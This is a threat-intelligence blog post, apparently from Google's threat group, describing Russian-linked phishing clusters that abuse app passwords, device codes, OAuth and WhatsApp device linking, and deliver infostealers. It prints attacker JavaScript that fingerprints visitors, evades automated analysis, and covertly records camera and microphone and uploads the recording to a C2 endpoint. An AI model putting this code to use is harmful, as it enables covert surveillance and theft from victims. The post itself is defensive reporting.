  "b0f12bb90a1a802d342e24728bc7ab62":
    "id": "b0f12bb90a1a802d342e24728bc7ab62"
    "title": "Going with the Flow(s): Distinct Clusters Target Individuals of Interest to Russia"
    "link": "https://cloud.google.com/blog/topics/threat-intelligence/distinct-clusters-target-individuals-of-interest-to-russia/"
    "published": "2026-08-20 23:00:00"
    "fetched": "2026-08-27 21:31:27"
    "summary": "<div class=\"block-paragraph_advanced\"><p>Written by: Gabby Roncone, Wesley Shields</p>\n<hr />\n<h3><span style=\"vertical-align: baseline;\">Overview</span><strong style=\"vertical-align: baseline;\"> </strong></h3>\n<p><span style=\"vertical-align: baseline;\">Google Threat Intelligence Group (GTIG) is tracking three distinct suspected Russian cyber espionage threat clusters abusing legitimate authentication flows to target individuals working in academia, aerospace and defense, governments and think tanks across Europe, as well as academia and think tanks within the United States. </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/creative-phishing-academics-critics-of-russia\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Examples</span></a><span style=\"vertical-align: baseline;\"> of these techniques can be found in our previous blog on UNC6293’s phishing operations. We now track an additional two distinct suspected Russian clusters, UNC7005 and UNC5976, which conduct phishing, abuse OAuth flows, and/or deploy malware to victims. UNC7005 in particular is tied to the hospitality captive portal redirects reported on by </span><a href=\"https://reliaquest.com/blog/threat-spotlight-dns-poisoning-tactics-expand-to-hospitality/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Reliaquest</span></a><span style=\"vertical-align: baseline;\"> and </span><a href=\"https://www.microsoft.com/en-us/security/blog/2026/07/31/captivecrunch-midnight-blizzard-targets-travelers-worldwide-for-malware-delivery-and-credential-theft/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Microsoft</span></a><span style=\"vertical-align: baseline;\">. While each group conducts their campaigns differently, they all ultimately demonstrate a focus on abuse of legitimate authentication workflows to compromise accounts.</span></p>\n<p><span style=\"vertical-align: baseline;\">These clusters engage in persistent, adaptive phishing campaigns, using sophisticated social engineering tactics to compromise personal accounts across multiple platforms. Because these operations abuse legitimate authentication flows which may not immediately seem like phishing attempts to users, GTIG is raising awareness about these social engineering campaigns targeting individuals so that targets can more readily recognize malicious outreach.   </span></p>\n<h3><span style=\"vertical-align: baseline;\">UNC6293</span></h3>\n<p><span style=\"vertical-align: baseline;\">We assess with moderate confidence that UNC6293 is a sub cluster of ICE RELIC (formerly APT29) responsible for initial access operations</span><span style=\"vertical-align: baseline;\">. UNC6293 operations were </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/creative-phishing-academics-critics-of-russia\"><span style=\"text-decoration: underline; vertical-align: baseline;\">initially reported in June 2025</span></a><span style=\"vertical-align: baseline;\"> (also </span><a href=\"https://citizenlab.ca/research/russian-government-linked-social-engineering-targets-app-specific-passwords/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">by Citizen Lab</span></a><span style=\"vertical-align: baseline;\">) as an aggressive app password phishing campaign against prominent individuals that are critical of Russia. </span><a href=\"https://support.google.com/mail/answer/185833?hl=en\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">App passwords</span></a><span style=\"vertical-align: baseline;\"> are passcodes a user can set which gives a less secure app or device permission to access an account. In cases of app password phishing, attackers attempt to convince targets to set specific app passwords on their accounts, which the attackers then use to gain access to those accounts without needing two-factor authentication (2FA). As part of the previously documented UNC6293 campaign, the attacker impersonated the US State Department and attempted to lure targets into setting an app password named </span><code style=\"vertical-align: baseline;\">ms.state.gov</code><span style=\"vertical-align: baseline;\">. The instructions to do this were in a PDF that contained screenshots of the settings UNC6293 wanted the target to use.</span></p>\n<p><span style=\"vertical-align: baseline;\">In the intervening year, UNC6293 has continued to impersonate State Department officials and perform app password phishing. As one example, in October 2025, GTIG observed UNC6293 using a PDF lure document that contained the exact same screenshots as observed in June 2025, including the </span><code style=\"vertical-align: baseline;\">ms.state.gov</code><span style=\"vertical-align: baseline;\"> reference. While in 2025, the attacker requested that the victims share the app password back to them via email, in these newer operations, the attacker asked for it to be entered into an authentication form on an otherwise legitimate looking website.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Changed text in new lure document\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_1_Changed_text_in_new_lure_document.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 1: Changed text in new lure document</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">UNC6293 phishing campaigns tend to be small in scope, usually targeting fewer than five users at a time, and the application names and lures observed by GTIG tend to focus on diplomatic themes and upcoming conferences or meetings, such as those documented in </span><a href=\"https://www.volexity.com/blog/2025/12/04/dangerous-invitations-russian-threat-actor-spoofs-european-security-events-in-targeted-phishing-attacks/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">December 2025 by Volexity</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">Over time, UNC6293 continued impersonating the U.S State Department while incorporating OAuth phishing into their repertoire. In June 2026, GTIG observed OAuth phishing where UNC6293 requested targets share either the full URL or “verification code” after performing a legitimate login to an external provider. By providing the requested verification code the target would grant UNC6293 access to the account.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"UNC6293 requesting “verification code” on a phishing page, at foreignrelations[.]us\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_2_UNC6293_requesting_verification_c.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 2: UNC6293 requesting “verification code” on a phishing page, at foreignrelations[.]us</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">UNC7005</span><strong style=\"vertical-align: baseline;\"> </strong></h3>\n<p><span style=\"vertical-align: baseline;\">UNC7005 (aka STORM-2945) is a threat cluster identified in February 2026 that primarily targets academia, diplomatic, and nonprofit personnel across Ukraine, Western Europe, and the US Although this group shares many high-level similarities with UNC6293, including targeting overlaps, we are tracking it separately due to its lower sophistication and poor operational security, infrastructure with divergent characteristics, and incorporation of malware. </span><span style=\"vertical-align: baseline;\">Similarly we assess with moderate confidence that UNC7005 is another initial access cluster connected to ICE RELIC.</span></p>\n<h4><span style=\"vertical-align: baseline;\">App Password Phishing</span></h4>\n<p><span style=\"vertical-align: baseline;\">Since at least February 2026, UNC7005 has conducted highly selective app password phishing operations targeting individuals of interest to the Russian state. These operations use similar social engineering tactics to UNC6293, but differ in that the app passwords used appear to be unique per target in all observed cases except one. They are specific to the theme used when social engineering the target, such as referencing the type of activity the target is supposedly engaging in (i.e. secure file sharing) and/or the organization UNC7005 is masquerading as.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Social engineering landing page used in a UNC7005 operation\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_3_Social_engineering_landing_page_u.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 3: Social engineering landing page used in a UNC7005 operation</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Device Code Phishing</span></h4>\n<p><span style=\"vertical-align: baseline;\">UNC7005 also conducts device code phishing operations for both Microsoft and WhatsApp accounts. The themes of these phishing waves often involve invitations for calls with individuals from notable organizations related to the target’s field or, most recently, invitations to diplomatic events and conferences. </span></p>\n<h4><span style=\"font-style: italic; vertical-align: baseline;\">Microsoft Device Code Phishing</span></h4>\n<p><span style=\"vertical-align: baseline;\">UNC7005 initially delivers Microsoft device code phishing attempts via email, which are sometimes sent from the attacker-controlled domains they create to masquerade as legitimate events and organizations. The emails contain links to these attacker websites which often use similar templates. For example, UNC7005 initially re-used the website template from a previous “embassy invite” themed operation in late April 2026 in a different operation spoofing the legitimate GLOBSEC forum in May 2026.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Landing page spoofing GLOBSEC\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_4_Landing_page_spoofing_GLOBSEC.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 4: Landing page spoofing GLOBSEC</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Upon accessing the webpage, the target’s system is fingerprinted, likely to check for an automated scanner accessing the page.</span></p>\n<p> </p>\n<p> </p>\n<pre class=\"language-plain\"><code>  (function(){\n    var fp = {\n      tid:   \"3311a310cd4f40d4\",\n      sw:    screen.width,\n      sh:    screen.height,\n      tz:    Intl.DateTimeFormat().resolvedOptions().timeZone,\n      lang:  navigator.language,\n      plat:  navigator.platform,\n      cores: navigator.hardwareConcurrency || null,\n      mem:   navigator.deviceMemory   || null,\n      touch: navigator.maxTouchPoints || 0,\n    };\n    fetch('/fingerprint', {\n      method:   'POST',\n      headers:  {'Content-Type': 'application/json'},\n      body:     JSON.stringify(fp),\n      keepalive: true,\n    }).catch(function(){});\n</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\">Figure 5: Initial system fingerprint for analysis evasion</span></span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: []&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The target is prompted to confirm their attendance to the conference and register. The registration process is thorough, and notably contains an epicurean wine selection, which was a theme in multiple </span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/apt29-evolving-diplomatic-phishing\"><span style=\"text-decoration: underline; vertical-align: baseline;\">previous ICE RELIC-linked phishing campaigns</span></a><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Registration form before “verification” via device code\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_6_Registration_form_before_verifica.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 6: Registration form before “verification” via device code</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Epicurean wine selection\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_7_Epicurean_wine_selection.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 7: Epicurean wine selection</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Upon filling out the form, the target is once again prompted to submit their identity verification. Notably, in the GLOBSEC example, the text refers to “Embassy security policy” rather than GLOBSEC - an artifact from a previous operation.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"“Identity Verification” prompt after registration\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_8_Identity_Verification_prompt_afte.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 8: “Identity Verification” prompt after registration</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"GLOBSEC lure displaying device code after registration\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_9_GLOBSEC_lure_displaying_device_co.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 9: GLOBSEC lure displaying device code after registration</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Within days of identifying this activity, we observed the actor actively make changes to the operation. Citing technical difficulties in the page text, UNC7005 revised the template they used for social engineering, modifying the questions asked to the target as well as the color scheme (</span><code style=\"vertical-align: baseline;\">5b8d50c2e8cc3038b7c6e6dbf1219f6e814930a1e3c0053143a1191ae67f8ffc</code><span style=\"vertical-align: baseline;\">).</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"GLOBSEC re-do\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_10_GLOBSEC_re-do.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 10: GLOBSEC re-do</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This time, UNC7005 included a script in the main registration page to attempt to detect and evade automated analysis efforts.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-markup\"><code>(function(){\n      var h = false;\n      try {\n        // webdriver flag â€” set by ChromeDriver, Puppeteer, Selenium\n        if (navigator.webdriver) h = true;\n        // Headless Chrome has no plugins at all\n        // Headless Chrome / PhantomJS often have no languages\n        if (!h &amp;&amp; (!navigator.languages || navigator.languages.length === 0)) h = true;\n        // Chrome-specific runtime object absent in headless older builds\n        if (!h &amp;&amp; typeof window.chrome === 'undefined' &amp;&amp;\n            /chrome/i.test(navigator.userAgent)) h = true;\n        // Permission query behaves differently in headless\n        if (!h &amp;&amp; navigator.permissions) {\n          navigator.permissions.query({name:'notifications'}).then(function(r){\n            if (r.state === 'denied' &amp;&amp; Notification.permission === 'default') {\n              document.documentElement.innerHTML = '';\n              window.stop();\n            }\n          }).catch(function(){});\n        }\n      } catch(e) { h = true; }\n      if (h) { document.documentElement.innerHTML = ''; window.stop(); }\n    })();\n</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\">Figure 11: Second system fingerprint for analysis evasion</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"font-style: italic; vertical-align: baseline;\">WhatsApp Device Linking (and More)</span></h4>\n<p><span style=\"vertical-align: baseline;\">In May and June 2026, UNC7005 conducted social engineering operations spoofing WhatsApp. The phishing pages distributed by the attacker lure targets into linking their WhatsApp accounts with an attacker controlled device in order to join a secure WhatsApp call, chat, or document share. The attacker also attempts multiple other methods of compromise after the device is linked.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"WhatsApp compromise flow\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_12_WhatsApp_compromise_flow.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 12: WhatsApp compromise flow</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Upon accessing the page, the target is prompted to provide a phone number. The phone number is used to create a legitimate WhatsApp device link request with the attacker device, and then displays the legitimate QR and linking code to the target alongside instructions to the user to link their device.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Malicious landing page for WhatsApp device linking\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_13_Malicious_landing_page_for_Whats.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 13: Malicious landing page for WhatsApp device linking</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">After the target successfully links their account to the attacker's WhatsApp device, the phishing page displays an additional prompt to the user to either join a voice call, encrypted chat, or download a file.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Post-Compromise “Voice Call”\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_14_Post-Compromise_Voice_Call.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 14: Post-Compromise “Voice Call”</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">If the target joins the voice call, malicious JavaScript to record target audio and video is triggered. The webpage presents a fake voice call with a ring for a limited amount of time while the audio and video are recorded. The recording would then be sent to the attacker command-and-control (C2) endpoint </span><code style=\"vertical-align: baseline;\">/api/code/&lt;unique user session id&gt;/recording </code><span style=\"vertical-align: baseline;\">when the call “fails</span><code style=\"vertical-align: baseline;\">”.</code></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-markup\"><code>function startMediaRecording() {\n    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {\n      return Promise.resolve();\n    }\n    return navigator.mediaDevices.getUserMedia({ video: true, audio: true })\n      .then(function(stream) {\n        mediaStream = stream;\n        var selfVideo = document.getElementById('self-video');\n        var selfView = document.getElementById('self-view');\n        if (selfVideo &amp;&amp; selfView) {\n          selfVideo.srcObject = stream;\n          selfView.style.display = '';\n        }\n        recordedChunks = [];\n        var options = { mimeType: 'video/webm;codecs=vp8,opus' };\n        if (!MediaRecorder.isTypeSupported(options.mimeType)) {\n          options = { mimeType: 'video/webm' };\n          if (!MediaRecorder.isTypeSupported(options.mimeType)) {\n            options = {};\n          }\n        }\n        mediaRecorder = new MediaRecorder(stream, options);\n        mediaRecorder.ondataavailable = function(e) {\n          if (e.data &amp;&amp; e.data.size &gt; 0) recordedChunks.push(e.data);\n        };\n        mediaRecorder.start(1000);\n      })\n      .catch(function() {\n      });\n  }\n  \n  [...]\n  \n  function uploadRecording() {\n    if (mediaStream) {\n      mediaStream.getTracks().forEach(function(t) { t.stop(); });\n      mediaStream = null;\n    }\n    if (!recordedChunks.length) return;\n\n    var blob = new Blob(recordedChunks, { type: recordedChunks[0].type || 'video/webm' });\n    recordedChunks = [];\n    var formData = new FormData();\n    formData.append('recording', blob, 'recording_' + sessionId + '.webm');\n\n    fetch('/api/code/' + sessionId + '/recording', { method: 'POST', body: formData })\n      .then(function(r) { if (!r.ok) throw new Error('Upload failed'); })\n      .catch(function() {\n        return fetch('/api/code/' + sessionId + '/recording', { method: 'POST', body: formData });\n      })\n      .then(function(r) { if (r &amp;&amp; !r.ok) throw new Error('Upload failed'); })\n      .catch(function() {});\n  }\n</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\"><span style=\"vertical-align: baseline;\">Figure 15: Malicious JavaScript to record audio and visual of target and upload to C2</span></span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The phishing page may also present the target with a fake “encrypted chat” option after successful device linking. The JavaScript first renders chat credentials and an additional login URL with uniform resource identifier (URI) </span><code style=\"vertical-align: baseline;\">/chat/login</code><span style=\"vertical-align: baseline;\">. It prompts the user to copy the username and password presented to them to log in on the secondary URL. </span></p>\n<p><span style=\"vertical-align: baseline;\">If the target was presented with a file transfer lure and successfully linked their WhatsApp account, the web page renders a file download button. GTIG is unable to assess what file may have been staged for download at this time. </span></p>\n<h4><span style=\"vertical-align: baseline;\">Browser Stealers &amp; Malware-as-a-Service (MaaS)</span></h4>\n<p><span style=\"vertical-align: baseline;\">In late May 2026, UNC7005 conducted a much broader phishing wave than any we had previously observed. This operation targeted prominent, mostly US based academics, diplomats, and researchers focused on Russia and former Soviet states. The email address used by the attacker in this operation was almost identical to one used in a UNC6293 operation in June 2025.</span></p>\n<p><span style=\"vertical-align: baseline;\">In this operation, UNC7005 distributed malicious URLs through phishing emails. If the target browsed to the URL from a Windows or macOS device, it directed targets to a landing page spoofing a “summit” related to a resolution to support Ukraine. If not, it displayed an error to the user and requested that they switch to another OS for compatibility. </span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Landing page prompting targets to download malware\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_16_Landing_page_prompting_targets_t.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 16: Landing page prompting targets to download malware</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The website was more elaborately built to social engineer the target, containing information about the various parts of the resolution and even contained contact information for the threat actor for questions or technical difficulties. </span></p>\n<p><span style=\"vertical-align: baseline;\">If the target clicked the button to download a “Summit Companion App” to read the full resolution on Ukraine, they were served infostealer malware based on the OS indicated in the target’s User Agent.</span></p>\n<h4><span style=\"font-style: italic; vertical-align: baseline;\">Windows option</span></h4>\n<p><span style=\"vertical-align: baseline;\">If the User Agent indicates that the target is browsing from a machine running Windows, the malicious webpage serves a sample of VIDAR to the target (</span><code style=\"vertical-align: baseline;\">1d9299799a7b8da67c44ebec064d64542c27645f8e84de4a22ca3f6cbc843e3c</code><span style=\"vertical-align: baseline;\">). This sample is an obfuscated Go binary with a C2 of </span><code style=\"vertical-align: baseline;\">107.189.18[.]7</code><span style=\"vertical-align: baseline;\">. VIDAR is an infostealer operated as a Malware as a Service (MaaS) which primarily targets sensitive information stored in browsers, such as credentials, stored payment information, cookie information, and saved addresses, which it then sends to the C2 in plaintext. </span></p>\n<h4><span style=\"font-style: italic; vertical-align: baseline;\">Mac option</span></h4>\n<p><span style=\"vertical-align: baseline;\">If the User Agent indicates that the target is browsing from a machine running macOS, the malicious webpage served a sample of ATOMIC to the target (</span><code style=\"vertical-align: baseline;\">c5826032207d623a7f6caec8465af7364eccc355f9a48897da2a54f3e4420265</code><span style=\"vertical-align: baseline;\">). ATOMIC (aka AtomicStealer) is a macOS infostealer operated as a MaaS and also targets sensitive browser information. </span></p>\n<h3><span style=\"vertical-align: baseline;\">OAuth Phishing</span></h3>\n<h4><span style=\"font-style: italic; vertical-align: baseline;\">Cloud Projects </span></h4>\n<p><span style=\"vertical-align: baseline;\">In early August 2026, UNC7005 began Google account OAuth phishing operations using cloud infrastructure. Beginning on July 31, 2026, UNC7005 registered domains spoofing the legitimate </span><a href=\"https://fi.linkedin.com/company/focfi\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Finnish Operations Center (FOC)</span></a><span style=\"vertical-align: baseline;\">, which supports Finnish companies in the defense and security markets, specifically in the context of the North Atlantic Treaty Organization (NATO). Between August 6 and August 13, 2026, UNC7005 sent targeted phishing emails linking to an attacker-controlled domain to targets in or related to the European defense industry.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Landing page spoofing Finnish Operations Center, prompting target to sign in and gain access to a resource\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_17_Landing_page_spoofing_Finnish_Op.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 17: Landing page spoofing Finnish Operations Center, prompting target to sign in and gain access to a resource</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Upon clicking “Get Access” or “Sign in With Google”, the target is redirected to a legitimate Google OAuth login page which prompts the target to sign in to their account to continue. If the target authenticates, they are redirected to an attacker-controlled, testing mode, unverified cloud project which is likely used to steal authentication tokens that grant the attacker access to the target account.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Google OAuth login before redirect to attacker-controlled cloud project\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Figure_18_Google_OAuth_login_before_redire.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 18: Google OAuth login before redirect to attacker-controlled cloud project</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"font-style: italic; vertical-align: baseline;\">Other OAuth Phishing</span></h4>\n<p><span style=\"vertical-align: baseline;\">In early August 2026, GTIG identified a highly targeted phishing operation in which UNC7005 sent legitimate Microsoft OAuth URLs directly to targets. The attacker email used in this operation was also used in the cloud project OAuth phishing operations.   </span></p>\n<h3><span style=\"vertical-align: baseline;\">UNC7005 and the Hospitality Captive Portal Campaign</span></h3>\n<p><span style=\"vertical-align: baseline;\">In late April 2026, GTIG began tracking UNC7005 infrastructure mimicking Microsoft authentication resources. As each domain appeared to be operationalized by the threat actor, GTIG took actions to add that infrastructure to the </span><a href=\"https://safebrowsing.google.com/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Safe Browsing</span></a><span style=\"vertical-align: baseline;\"> blocklist. Consistent with public reporting, in mid-July 2026, GTIG began observing users redirected to this attacker infrastructure from captive portals associated with hotels and conference centers. On July 23, 2026, Reliaquest published a </span><a href=\"https://reliaquest.com/blog/threat-spotlight-dns-poisoning-tactics-expand-to-hospitality/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">blog</span></a><span style=\"vertical-align: baseline;\"> analyzing domain name system (DNS) requests showing captive portal redirects to attacker-controlled login pages spoofing Microsoft authentication resources. Later, on July 31, 2026, </span><a 